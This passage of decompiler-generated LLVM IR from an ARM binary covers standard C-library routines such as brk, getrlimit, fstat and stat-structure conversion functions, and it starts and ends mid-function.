  %v0_fef8 = load i32, i32* %r2.global-to-local, align 4
  %v1_fef8 = load i32, i32* %r1.global-to-local, align 4
  %v2_fef8 = inttoptr i32 %v1_fef8 to i32*
  store i32 %v0_fef8, i32* %v2_fef8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_ff04(i32 %arg1) local_unnamed_addr {
dec_label_pc_ff04:
  %v0_ff04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ff04, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_ff04
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ff04, %bb
  %v4_ff08 = phi i32 [ %arg1, %dec_label_pc_ff04 ], [ 0, %bb ]
  ret i32 %v4_ff08

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_ff48:
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r2, align 4
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 9508) to i32*), align 4
  ret i32 0
}

define i32 @__aeabi_unwind_cpp_pr0() local_unnamed_addr {
entry:
  %v1_ff58 = load i32, i32* @r0, align 4
  ret i32 %v1_ff58
}

define i32 @__aeabi_unwind_cpp_pr1() local_unnamed_addr {
entry:
  %v1_ff5c = load i32, i32* @r0, align 4
  ret i32 %v1_ff5c
}

define i32 @__aeabi_unwind_cpp_pr2() local_unnamed_addr {
entry:
  %v1_ff60 = load i32, i32* @r0, align 4
  ret i32 %v1_ff60
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ff64 = load i32, i32* @r7, align 4
  store i32 %v3_ff64, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_ff8c, label %dec_label_pc_ff7c

dec_label_pc_ff7c:                                ; preds = %entry
  %v0_ff7c = call i32 @__GI___errno_location()
  %v0_ff80 = load i32, i32* %r7.global-to-local, align 4
  %v1_ff80 = sub i32 0, %v0_ff80
  %v2_ff84 = inttoptr i32 %v0_ff7c to i32*
  store i32 %v1_ff80, i32* %v2_ff84, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_ff90.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ff8c

dec_label_pc_ff8c:                                ; preds = %entry, %dec_label_pc_ff7c
  %v2_ff90 = phi i32 [ %v3_ff64, %entry ], [ %v2_ff90.pre, %dec_label_pc_ff7c ]
  %v0_ff8c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_ff7c ]
  store i32 %v2_ff90, i32* %r7.global-to-local, align 4
  ret i32 %v0_ff8c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ff8c, { 1, 0 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_ffa0 = load i32, i32* @r1, align 4
  store i32 %v0_ffa0, i32* @r3, align 4
  %v0_ffb0 = load i32, i32* @r0, align 4
  store i32 %v0_ffb0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ffb0, -4095
  br i1 %tmp, label %dec_label_pc_ffd0, label %dec_label_pc_ffbc

dec_label_pc_ffbc:                                ; preds = %entry
  %v0_ffbc = call i32 @__GI___errno_location()
  %v0_ffc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_ffc0 = sub i32 0, %v0_ffc0
  store i32 %v1_ffc0, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_ffc8 = inttoptr i32 %v0_ffbc to i32*
  store i32 %v1_ffc0, i32* %v2_ffc8, align 4
  br label %dec_label_pc_ffe0

dec_label_pc_ffd0:                                ; preds = %entry
  %v2_ffd0 = icmp eq i32 %v0_ffb0, 0
  br i1 %v2_ffd0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_ffd0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ffd0, %bb
  call void @__pseudo_cond_branch(i1 %v2_ffd0, i32 ptrtoint (i32* @global_var_10168.334 to i32))
  br label %dec_label_pc_ffe0

dec_label_pc_ffe0:                                ; preds = %dec_label_pc_ffbc, %.thread
  %v0_ffe0 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_ffe0

; uselistorder directives
  uselistorder i32 %v0_ffb0, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ffe0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_fff0 = load i32, i32* @r4, align 4
  store i32 %v3_fff0, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_10008 = inttoptr i32 %arg2 to i8*
  %v3_10008 = call i32 @__GI_memset(i8* %v2_10008, i32 0)
  %v2_1000c = load i32, i32* %arg1, align 4
  store i32 %v2_1000c, i32* %r3.global-to-local, align 4
  %v3_1000c = add i32 %tmp, 4
  %v4_1000c = inttoptr i32 %v3_1000c to i32*
  %v5_1000c = load i32, i32* %v4_1000c, align 4
  store i32 %v5_1000c, i32* %r4.global-to-local, align 4
  %v0_10010 = load i32, i32* %r5.global-to-local, align 4
  %v1_10010 = inttoptr i32 %v0_10010 to i32*
  store i32 %v2_1000c, i32* %v1_10010, align 4
  %v3_10010 = add i32 %v0_10010, 4
  %v4_10010 = inttoptr i32 %v3_10010 to i32*
  %v5_10010 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_10010, i32* %v4_10010, align 4
  %v0_10014 = load i32, i32* %r6.global-to-local, align 4
  %v1_10014 = add i32 %v0_10014, 12
  %v2_10014 = inttoptr i32 %v1_10014 to i32*
  %v3_10014 = load i32, i32* %v2_10014, align 4
  %v1_10018 = load i32, i32* %r5.global-to-local, align 4
  %v2_10018 = add i32 %v1_10018, 12
  %v3_10018 = inttoptr i32 %v2_10018 to i32*
  store i32 %v3_10014, i32* %v3_10018, align 4
  %v0_1001c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001c = add i32 %v0_1001c, 96
  store i32 %v1_1001c, i32* %r3.global-to-local, align 4
  %v1_10020 = inttoptr i32 %v1_1001c to i32*
  %v2_10020 = load i32, i32* %v1_10020, align 4
  store i32 %v2_10020, i32* %r3.global-to-local, align 4
  %v3_10020 = add i32 %v0_1001c, 100
  %v4_10020 = inttoptr i32 %v3_10020 to i32*
  %v5_10020 = load i32, i32* %v4_10020, align 4
  store i32 %v5_10020, i32* %r4.global-to-local, align 4
  %v1_10024 = add i32 %v0_1001c, 56
  %v2_10024 = inttoptr i32 %v1_10024 to i32*
  %v3_10024 = load i32, i32* %v2_10024, align 4
  store i32 %v3_10024, i32* %r2.global-to-local, align 4
  %v1_10028 = load i32, i32* %r5.global-to-local, align 4
  %v2_10028 = add i32 %v1_10028, 96
  %v3_10028 = inttoptr i32 %v2_10028 to i32*
  store i32 %v2_10020, i32* %v3_10028, align 4
  %v0_1002c = load i32, i32* %r4.global-to-local, align 4
  %v1_1002c = load i32, i32* %r5.global-to-local, align 4
  %v2_1002c = add i32 %v1_1002c, 100
  %v3_1002c = inttoptr i32 %v2_1002c to i32*
  store i32 %v0_1002c, i32* %v3_1002c, align 4
  %v0_10030 = load i32, i32* %r6.global-to-local, align 4
  %v1_10030 = add i32 %v0_10030, 24
  store i32 %v1_10030, i32* %ip.global-to-local, align 4
  %v1_10034 = inttoptr i32 %v1_10030 to i32*
  %v2_10034 = load i32, i32* %v1_10034, align 4
  store i32 %v2_10034, i32* %ip.global-to-local, align 4
  %v3_10034 = add i32 %v0_10030, 28
  %v4_10034 = inttoptr i32 %v3_10034 to i32*
  %v5_10034 = load i32, i32* %v4_10034, align 4
  store i32 %v5_10034, i32* %lr.global-to-local, align 4
  %v0_10038 = load i32, i32* %r2.global-to-local, align 4
  %v1_10038 = load i32, i32* %r5.global-to-local, align 4
  %v2_10038 = add i32 %v1_10038, 56
  %v3_10038 = inttoptr i32 %v2_10038 to i32*
  store i32 %v0_10038, i32* %v3_10038, align 4
  %v0_1003c = load i32, i32* %r6.global-to-local, align 4
  %v1_1003c = add i32 %v0_1003c, 72
  store i32 %v1_1003c, i32* %r3.global-to-local, align 4
  %v1_10040 = add i32 %v0_1003c, 32
  store i32 %v1_10040, i32* %r7.global-to-local, align 4
  %v1_10044 = inttoptr i32 %v1_10040 to i32*
  %v2_10044 = load i32, i32* %v1_10044, align 4
  store i32 %v2_10044, i32* %r7.global-to-local, align 4
  %v3_10044 = add i32 %v0_1003c, 36
  %v4_10044 = inttoptr i32 %v3_10044 to i32*
  %v5_10044 = load i32, i32* %v4_10044, align 4
  store i32 %v5_10044, i32* %r8.global-to-local, align 4
  %v1_10048 = inttoptr i32 %v1_1003c to i32*
  %v2_10048 = load i32, i32* %v1_10048, align 4
  %v3_10048 = add i32 %v0_1003c, 76
  %v4_10048 = inttoptr i32 %v3_10048 to i32*
  %v5_10048 = load i32, i32* %v4_10048, align 4
  store i32 %v5_10048, i32* %r1.global-to-local, align 4
  %v0_1004c = load i32, i32* %r5.global-to-local, align 4
  %v1_1004c = add i32 %v0_1004c, 72
  %v1_10050 = inttoptr i32 %v1_1004c to i32*
  store i32 %v2_10048, i32* %v1_10050, align 4
  %v3_10050 = add i32 %v0_1004c, 76
  %v4_10050 = inttoptr i32 %v3_10050 to i32*
  %v5_10050 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10050, i32* %v4_10050, align 4
  %v0_10054 = load i32, i32* %r7.global-to-local, align 4
  %v1_10054 = load i32, i32* %r5.global-to-local, align 4
  %v2_10054 = add i32 %v1_10054, 32
  %v3_10054 = inttoptr i32 %v2_10054 to i32*
  store i32 %v0_10054, i32* %v3_10054, align 4
  %v0_10058 = load i32, i32* %r8.global-to-local, align 4
  %v1_10058 = load i32, i32* %r5.global-to-local, align 4
  %v2_10058 = add i32 %v1_10058, 36
  %v3_10058 = inttoptr i32 %v2_10058 to i32*
  store i32 %v0_10058, i32* %v3_10058, align 4
  %v0_1005c = load i32, i32* %r6.global-to-local, align 4
  %v1_1005c = add i32 %v0_1005c, 80
  store i32 %v1_1005c, i32* %r3.global-to-local, align 4
  %v1_10060 = add i32 %v0_1005c, 48
  store i32 %v1_10060, i32* %r7.global-to-local, align 4
  %v1_10064 = inttoptr i32 %v1_10060 to i32*
  %v2_10064 = load i32, i32* %v1_10064, align 4
  store i32 %v2_10064, i32* %r7.global-to-local, align 4
  %v3_10064 = add i32 %v0_1005c, 52
  %v4_10064 = inttoptr i32 %v3_10064 to i32*
  %v5_10064 = load i32, i32* %v4_10064, align 4
  store i32 %v5_10064, i32* %r8.global-to-local, align 4
  %v1_10068 = inttoptr i32 %v1_1005c to i32*
  %v2_10068 = load i32, i32* %v1_10068, align 4
  %v3_10068 = add i32 %v0_1005c, 84
  %v4_10068 = inttoptr i32 %v3_10068 to i32*
  %v5_10068 = load i32, i32* %v4_10068, align 4
  store i32 %v5_10068, i32* %r1.global-to-local, align 4
  %v1_1006c = add i32 %v0_1005c, 16
  %v2_1006c = inttoptr i32 %v1_1006c to i32*
  %v3_1006c = load i32, i32* %v2_1006c, align 4
  store i32 %v3_1006c, i32* %r2.global-to-local, align 4
  %v0_10070 = load i32, i32* %r5.global-to-local, align 4
  %v1_10070 = add i32 %v0_10070, 80
  %v1_10074 = inttoptr i32 %v1_10070 to i32*
  store i32 %v2_10068, i32* %v1_10074, align 4
  %v3_10074 = add i32 %v0_10070, 84
  %v4_10074 = inttoptr i32 %v3_10074 to i32*
  %v5_10074 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10074, i32* %v4_10074, align 4
  %v0_10078 = load i32, i32* %r7.global-to-local, align 4
  %v1_10078 = load i32, i32* %r5.global-to-local, align 4
  %v2_10078 = add i32 %v1_10078, 48
  %v3_10078 = inttoptr i32 %v2_10078 to i32*
  store i32 %v0_10078, i32* %v3_10078, align 4
  %v0_1007c = load i32, i32* %r8.global-to-local, align 4
  %v1_1007c = load i32, i32* %r5.global-to-local, align 4
  %v2_1007c = add i32 %v1_1007c, 52
  %v3_1007c = inttoptr i32 %v2_1007c to i32*
  store i32 %v0_1007c, i32* %v3_1007c, align 4
  %v0_10080 = load i32, i32* %r2.global-to-local, align 4
  %v1_10080 = load i32, i32* %r5.global-to-local, align 4
  %v2_10080 = add i32 %v1_10080, 16
  %v3_10080 = inttoptr i32 %v2_10080 to i32*
  store i32 %v0_10080, i32* %v3_10080, align 4
  %v0_10084 = load i32, i32* %r6.global-to-local, align 4
  %v1_10084 = add i32 %v0_10084, 88
  store i32 %v1_10084, i32* %r3.global-to-local, align 4
  %v1_10088 = add i32 %v0_10084, 20
  %v2_10088 = inttoptr i32 %v1_10088 to i32*
  %v3_10088 = load i32, i32* %v2_10088, align 4
  store i32 %v3_10088, i32* %r2.global-to-local, align 4
  %v1_1008c = inttoptr i32 %v1_10084 to i32*
  %v2_1008c = load i32, i32* %v1_1008c, align 4
  %v3_1008c = add i32 %v0_10084, 92
  %v4_1008c = inttoptr i32 %v3_1008c to i32*
  %v5_1008c = load i32, i32* %v4_1008c, align 4
  store i32 %v5_1008c, i32* %r1.global-to-local, align 4
  %v1_10090 = add i32 %v0_10084, 64
  store i32 %v1_10090, i32* %r6.global-to-local, align 4
  %v1_10094 = inttoptr i32 %v1_10090 to i32*
  %v2_10094 = load i32, i32* %v1_10094, align 4
  store i32 %v2_10094, i32* %r6.global-to-local, align 4
  %v3_10094 = add i32 %v0_10084, 68
  %v4_10094 = inttoptr i32 %v3_10094 to i32*
  %v5_10094 = load i32, i32* %v4_10094, align 4
  store i32 %v5_10094, i32* %r7.global-to-local, align 4
  %v0_10098 = load i32, i32* %r5.global-to-local, align 4
  %v1_10098 = add i32 %v0_10098, 88
  store i32 %v1_10098, i32* %r3.global-to-local, align 4
  %v2_1009c = add i32 %v0_10098, 20
  %v3_1009c = inttoptr i32 %v2_1009c to i32*
  store i32 %v3_10088, i32* %v3_1009c, align 4
  %v0_100a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_100a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_100a0 = add i32 %v1_100a0, 24
  %v3_100a0 = inttoptr i32 %v2_100a0 to i32*
  store i32 %v0_100a0, i32* %v3_100a0, align 4
  %v0_100a4 = load i32, i32* %lr.global-to-local, align 4
  %v1_100a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_100a4 = add i32 %v1_100a4, 28
  %v3_100a4 = inttoptr i32 %v2_100a4 to i32*
  store i32 %v0_100a4, i32* %v3_100a4, align 4
  %v0_100a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_100a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_100a8 = add i32 %v1_100a8, 64
  %v3_100a8 = inttoptr i32 %v2_100a8 to i32*
  store i32 %v0_100a8, i32* %v3_100a8, align 4
  %v0_100ac = load i32, i32* %r7.global-to-local, align 4
  %v1_100ac = load i32, i32* %r5.global-to-local, align 4
  %v2_100ac = add i32 %v1_100ac, 68
  %v3_100ac = inttoptr i32 %v2_100ac to i32*
  store i32 %v0_100ac, i32* %v3_100ac, align 4
  %v0_100b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100b0 = inttoptr i32 %v0_100b0 to i32*
  store i32 %v2_1008c, i32* %v1_100b0, align 4
  %v3_100b0 = add i32 %v0_100b0, 4
  %v4_100b0 = inttoptr i32 %v3_100b0 to i32*
  %v5_100b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_100b0, i32* %v4_100b0, align 4
  %v2_100b4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_100b4, i32* %r4.global-to-local, align 4
  ret i32 %v2_1008c

; uselistorder directives
  uselistorder i32 %v0_10084, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1005c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 104, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_100bc = load i32, i32* @r4, align 4
  store i32 %v3_100bc, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_100d4 = inttoptr i32 %arg2 to i8*
  %v3_100d4 = call i32 @__GI_memset(i8* %v2_100d4, i32 0)
  %v2_100d8 = load i32, i32* %arg1, align 4
  %v3_100d8 = add i32 %tmp, 4
  %v4_100d8 = inttoptr i32 %v3_100d8 to i32*
  %v5_100d8 = load i32, i32* %v4_100d8, align 4
  store i32 %v5_100d8, i32* %r4.global-to-local, align 4
  %v0_100dc = load i32, i32* %r6.global-to-local, align 4
  %v1_100dc = inttoptr i32 %v0_100dc to i32*
  store i32 %v2_100d8, i32* %v1_100dc, align 4
  %v3_100dc = add i32 %v0_100dc, 4
  %v4_100dc = inttoptr i32 %v3_100dc to i32*
  %v5_100dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_100dc, i32* %v4_100dc, align 4
  %v0_100e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100e0 = add i32 %v0_100e0, 32
  %v1_100e4 = inttoptr i32 %v1_100e0 to i32*
  %v2_100e4 = load i32, i32* %v1_100e4, align 4
  %v3_100e4 = add i32 %v0_100e0, 36
  %v4_100e4 = inttoptr i32 %v3_100e4 to i32*
  %v5_100e4 = load i32, i32* %v4_100e4, align 4
  store i32 %v5_100e4, i32* %r4.global-to-local, align 4
  %v1_100e8 = add i32 %v0_100e0, 96
  %v2_100e8 = inttoptr i32 %v1_100e8 to i32*
  %v3_100e8 = load i32, i32* %v2_100e8, align 4
  store i32 %v3_100e8, i32* %r2.global-to-local, align 4
  %v1_100ec = load i32, i32* %r6.global-to-local, align 4
  %v2_100ec = add i32 %v1_100ec, 32
  %v3_100ec = inttoptr i32 %v2_100ec to i32*
  store i32 %v2_100e4, i32* %v3_100ec, align 4
  %v0_100f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_100f0 = add i32 %v1_100f0, 36
  %v3_100f0 = inttoptr i32 %v2_100f0 to i32*
  store i32 %v0_100f0, i32* %v3_100f0, align 4
  %v0_100f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_100f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_100f4 = add i32 %v1_100f4, 12
  %v3_100f4 = inttoptr i32 %v2_100f4 to i32*
  store i32 %v0_100f4, i32* %v3_100f4, align 4
  %v0_100f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_100f8 = add i32 %v0_100f8, 48
  %v2_100f8 = inttoptr i32 %v1_100f8 to i32*
  %v3_100f8 = load i32, i32* %v2_100f8, align 4
  %v1_100fc = add i32 %v0_100f8, 24
  store i32 %v1_100fc, i32* %ip.global-to-local, align 4
  %v1_10100 = inttoptr i32 %v1_100fc to i32*
  %v2_10100 = load i32, i32* %v1_10100, align 4
  store i32 %v2_10100, i32* %ip.global-to-local, align 4
  %v3_10100 = add i32 %v0_100f8, 28
  %v4_10100 = inttoptr i32 %v3_10100 to i32*
  %v5_10100 = load i32, i32* %v4_10100, align 4
  store i32 %v5_10100, i32* %lr.global-to-local, align 4
  %v1_10104 = load i32, i32* %r6.global-to-local, align 4
  %v2_10104 = add i32 %v1_10104, 44
  %v3_10104 = inttoptr i32 %v2_10104 to i32*
  store i32 %v3_100f8, i32* %v3_10104, align 4
  %v0_10108 = load i32, i32* %r5.global-to-local, align 4
  %v1_10108 = add i32 %v0_10108, 64
  %v2_10108 = inttoptr i32 %v1_10108 to i32*
  %v3_10108 = load i32, i32* %v2_10108, align 4
  %v1_1010c = add i32 %v0_10108, 56
  %v2_1010c = inttoptr i32 %v1_1010c to i32*
  %v3_1010c = load i32, i32* %v2_1010c, align 4
  store i32 %v3_1010c, i32* %r2.global-to-local, align 4
  %v1_10110 = load i32, i32* %r6.global-to-local, align 4
  %v2_10110 = add i32 %v1_10110, 52
  %v3_10110 = inttoptr i32 %v2_10110 to i32*
  store i32 %v3_10108, i32* %v3_10110, align 4
  %v0_10114 = load i32, i32* %r2.global-to-local, align 4
  %v1_10114 = load i32, i32* %r6.global-to-local, align 4
  %v2_10114 = add i32 %v1_10114, 48
  %v3_10114 = inttoptr i32 %v2_10114 to i32*
  store i32 %v0_10114, i32* %v3_10114, align 4
  %v0_10118 = load i32, i32* %r5.global-to-local, align 4
  %v1_10118 = add i32 %v0_10118, 72
  %v1_1011c = inttoptr i32 %v1_10118 to i32*
  %v2_1011c = load i32, i32* %v1_1011c, align 4
  %v3_1011c = add i32 %v0_10118, 76
  %v4_1011c = inttoptr i32 %v3_1011c to i32*
  %v5_1011c = load i32, i32* %v4_1011c, align 4
  store i32 %v5_1011c, i32* %r1.global-to-local, align 4
  %v0_10120 = load i32, i32* %r6.global-to-local, align 4
  %v1_10120 = add i32 %v0_10120, 56
  %v1_10124 = inttoptr i32 %v1_10120 to i32*
  store i32 %v2_1011c, i32* %v1_10124, align 4
  %v3_10124 = add i32 %v0_10120, 60
  %v4_10124 = inttoptr i32 %v3_10124 to i32*
  %v5_10124 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10124, i32* %v4_10124, align 4
  %v0_10128 = load i32, i32* %r5.global-to-local, align 4
  %v1_10128 = add i32 %v0_10128, 80
  %v1_1012c = inttoptr i32 %v1_10128 to i32*
  %v2_1012c = load i32, i32* %v1_1012c, align 4
  %v3_1012c = add i32 %v0_10128, 84
  %v4_1012c = inttoptr i32 %v3_1012c to i32*
  %v5_1012c = load i32, i32* %v4_1012c, align 4
  store i32 %v5_1012c, i32* %r1.global-to-local, align 4
  %v0_10130 = load i32, i32* %r6.global-to-local, align 4
  %v1_10130 = add i32 %v0_10130, 64
  %v1_10134 = inttoptr i32 %v1_10130 to i32*
  store i32 %v2_1012c, i32* %v1_10134, align 4
  %v3_10134 = add i32 %v0_10130, 68
  %v4_10134 = inttoptr i32 %v3_10134 to i32*
  %v5_10134 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10134, i32* %v4_10134, align 4
  %v0_10138 = load i32, i32* %r5.global-to-local, align 4
  %v1_10138 = add i32 %v0_10138, 16
  %v2_10138 = inttoptr i32 %v1_10138 to i32*
  %v3_10138 = load i32, i32* %v2_10138, align 4
  %v1_1013c = load i32, i32* %r6.global-to-local, align 4
  %v2_1013c = add i32 %v1_1013c, 16
  %v3_1013c = inttoptr i32 %v2_1013c to i32*
  store i32 %v3_10138, i32* %v3_1013c, align 4
  %v0_10140 = load i32, i32* %r5.global-to-local, align 4
  %v1_10140 = add i32 %v0_10140, 88
  %v1_10144 = add i32 %v0_10140, 20
  %v2_10144 = inttoptr i32 %v1_10144 to i32*
  %v3_10144 = load i32, i32* %v2_10144, align 4
  store i32 %v3_10144, i32* %r2.global-to-local, align 4
  %v1_10148 = inttoptr i32 %v1_10140 to i32*
  %v2_10148 = load i32, i32* %v1_10148, align 4
  %v3_10148 = add i32 %v0_10140, 92
  %v4_10148 = inttoptr i32 %v3_10148 to i32*
  %v5_10148 = load i32, i32* %v4_10148, align 4
  store i32 %v5_10148, i32* %r1.global-to-local, align 4
  %v0_1014c = load i32, i32* %r6.global-to-local, align 4
  %v1_1014c = add i32 %v0_1014c, 72
  %v1_10150 = inttoptr i32 %v1_1014c to i32*
  store i32 %v2_10148, i32* %v1_10150, align 4
  %v3_10150 = add i32 %v0_1014c, 76
  %v4_10150 = inttoptr i32 %v3_10150 to i32*
  %v5_10150 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10150, i32* %v4_10150, align 4
  %v0_10154 = load i32, i32* %r2.global-to-local, align 4
  %v1_10154 = load i32, i32* %r6.global-to-local, align 4
  %v2_10154 = add i32 %v1_10154, 20
  %v3_10154 = inttoptr i32 %v2_10154 to i32*
  store i32 %v0_10154, i32* %v3_10154, align 4
  %v0_10158 = load i32, i32* %ip.global-to-local, align 4
  %v1_10158 = load i32, i32* %r6.global-to-local, align 4
  %v2_10158 = add i32 %v1_10158, 24
  %v3_10158 = inttoptr i32 %v2_10158 to i32*
  store i32 %v0_10158, i32* %v3_10158, align 4
  %v0_1015c = load i32, i32* %lr.global-to-local, align 4
  %v1_1015c = load i32, i32* %r6.global-to-local, align 4
  %v2_1015c = add i32 %v1_1015c, 28
  %v3_1015c = inttoptr i32 %v2_1015c to i32*
  store i32 %v0_1015c, i32* %v3_1015c, align 4
  %v2_10160 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10160, i32* %r4.global-to-local, align 4
  ret i32 %v2_10148

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 92, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_10184 = inttoptr i32 %arg2 to i8*
  %v3_10184 = call i32 @__GI_memset(i8* %v2_10184, i32 0)
  %v1_10188 = add i32 %tmp, 4
  %v2_10188 = inttoptr i32 %v1_10188 to i32*
  %v3_10188 = load i32, i32* %v2_10188, align 4
  %v2_1018c = load i32, i32* %arg1, align 4
  store i32 %v2_1018c, i32* %r8.global-to-local, align 4
  %v1_10190 = load i32, i32* %r5.global-to-local, align 4
  %v2_10190 = add i32 %v1_10190, 12
  %v3_10190 = inttoptr i32 %v2_10190 to i32*
  store i32 %v3_10188, i32* %v3_10190, align 4
  %v0_10194 = load i32, i32* %r4.global-to-local, align 4
  %v1_10194 = add i32 %v0_10194, 20
  %v2_10194 = inttoptr i32 %v1_10194 to i32*
  %v3_10194 = load i32, i32* %v2_10194, align 4
  %v1_10198 = add i32 %v0_10194, 16
  %v2_10198 = inttoptr i32 %v1_10198 to i32*
  %v3_10198 = load i32, i32* %v2_10198, align 4
  store i32 %v3_10198, i32* %r6.global-to-local, align 4
  %v1_1019c = load i32, i32* %r5.global-to-local, align 4
  %v2_1019c = add i32 %v1_1019c, 44
  %v3_1019c = inttoptr i32 %v2_1019c to i32*
  store i32 %v3_10194, i32* %v3_1019c, align 4
  %v0_101a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_101a0 = add i32 %v0_101a0, 24
  %v2_101a0 = inttoptr i32 %v1_101a0 to i32*
  %v3_101a0 = load i32, i32* %v2_101a0, align 4
  %v1_101a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_101a4 = add i32 %v1_101a4, 48
  %v3_101a4 = inttoptr i32 %v2_101a4 to i32*
  store i32 %v3_101a0, i32* %v3_101a4, align 4
  %v0_101a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_101a8 = add i32 %v0_101a8, 28
  %v2_101a8 = inttoptr i32 %v1_101a8 to i32*
  %v3_101a8 = load i32, i32* %v2_101a8, align 4
  %v1_101ac = load i32, i32* %r5.global-to-local, align 4
  %v2_101ac = add i32 %v1_101ac, 52
  %v3_101ac = inttoptr i32 %v2_101ac to i32*
